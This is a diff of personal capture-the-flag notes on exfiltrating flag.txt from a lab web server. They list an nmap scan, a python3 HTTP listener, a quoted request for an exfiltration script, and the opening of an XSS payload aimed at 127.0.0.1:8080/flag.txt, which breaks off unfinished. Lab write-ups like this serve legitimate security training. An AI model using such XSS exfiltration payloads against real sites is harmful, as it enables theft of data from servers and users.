@@ -9,7 +9,7 @@ OPTIONS TO USE: reverse shell or cross-site scripting.
 READ THE FLAG  - flag.txt
 
 
-http://10.10.239.26:8080/flag.txt
+### http://10.10.239.26:8080/flag.txt ###
 
 	1. Use nmap scan of nmap -A -F -oN nmapstickershop.txt target ip
 	
@@ -22,7 +22,7 @@ Use python3 -m http.server in terminal to listen and wait for response
 
 " Create a script to get a flag.txt file from a local host on a server 127.0.0.1:8080/flag.txt that send the flag to my machine which is on port 8000 for ethical hacking purpose."
 
-The script for XSS 
+### The script for XSS ###
 
 <script>
  // Define the target URL where the sensitive data (e.g., flag.txt) resides const targetUrl = "http://127.0.0.1:8080/flag.txt"; 
